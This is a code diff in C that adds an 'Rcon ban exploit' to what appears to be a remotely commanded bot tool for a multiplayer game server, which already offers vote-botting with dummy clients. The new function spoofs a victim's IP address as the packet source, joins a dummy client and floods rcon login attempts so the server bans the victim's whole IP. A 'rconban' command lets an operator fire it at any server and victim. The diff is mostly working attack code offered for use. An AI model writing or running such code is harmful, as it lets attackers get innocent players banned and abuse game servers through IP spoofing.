@@ -322,6 +322,61 @@ void VoteBot(const char *IP, int Port, int Amount, int v)
 	ConnectDummies(IP, Port, Amount, v);
 }
 
+/*
+ ***					  Rcon ban exploit.
+ ***
+ *** We don't need the targets port for this exploit, we just connect a
+ *** dummy with the target's ip and spam rcon auth packets. This will get his
+ *** whole ip banned. For this procedere we don't need to connect fully, means
+ *** if we dont send the READY packet it will still work, but the dummy won't
+ *** actually apear ingame.
+*/
+void RconBan(const char *SrvIP, int Port, const char *BanIP)
+{
+	if (!Create(&m_Sock[0]))
+		Close(0);
+
+	m_FromIP[0] = inet_addr(BanIP);
+
+	m_FromPort = htons(1111);
+
+	m_ToIP = inet_addr(SrvIP);
+	m_ToPort = htons(Port);
+
+	unsigned char buffer[2048];
+	int BufferSize = 0;
+	Reset(0);
+
+	ZeroMemory(buffer, sizeof(buffer));
+	BufferSize = PackConnect(&buffer[0], 0);
+	SendData((const char*)buffer, BufferSize, 0);
+
+	ZeroMemory(buffer, sizeof(buffer));
+	BufferSize = PackClientInfo(&buffer[0], 0);
+	SendData((const char*)buffer, BufferSize, 0);
+
+	ZeroMemory(buffer, sizeof(buffer));
+	BufferSize = PackReady(&buffer[0], 0);
+	SendData((const char*)buffer, BufferSize, 0);
+
+	ZeroMemory(buffer, sizeof(buffer));
+	BufferSize = PackSendInfo(&buffer[0], 0);
+	SendData((const char*)buffer, BufferSize, 0);
+
+	ZeroMemory(buffer, sizeof(buffer));
+	BufferSize = PackEnterGame(&buffer[0], 0);
+	SendData((const char*)buffer, BufferSize, 0);
+
+	// send the rcon auth's
+	int i;
+	for(i = 0; i < 100; i++)
+	{
+		ZeroMemory(buffer, 2048);
+		BufferSize = PackRconAuth(&buffer[0], 0);
+		SendData((const char*)buffer, BufferSize, 0);
+	}
+}
+
 void Tick()
 {
 	if (time > 500) //once in 500 ms
@@ -413,6 +468,18 @@ DWORD WINAPI WorkingThread(LPVOID lpParam)
 				}
 				else
 					send(g_Client, "[Server]: Please use: votebot <ip> <port> <num> <vote>", strlen("[Server]: Please use: votebot <ip> <port> <num> <vote>"), 0);
+			}
+			else if(strcmp(aCmd[0], "rconban") == 0)
+			{
+				if(aCmd[1][0] && aCmd[2][0] && aCmd[3][0])
+				{
+					int Port = atoi(aCmd[2]);
+					RconBan(aCmd[1], Port, aCmd[3]);
+
+					send(g_Client, "[Server]: Dummy for banning sent successfully!", strlen("[Server]: Dummy for banning sent successfully!"), 0);
+				}
+				else
+					send(g_Client, "[Server]: Please use: rconban <srvip> <srvport> <banip>", strlen("[Server]: Please use: rcon ban <srvip> <srvport> <banip>"), 0);
 			}
 			else
 				send(g_Client, "[Server]: We don't know this cmd. Try again.", strlen("[Server]: We don't know this cmd. Try again."), 0);
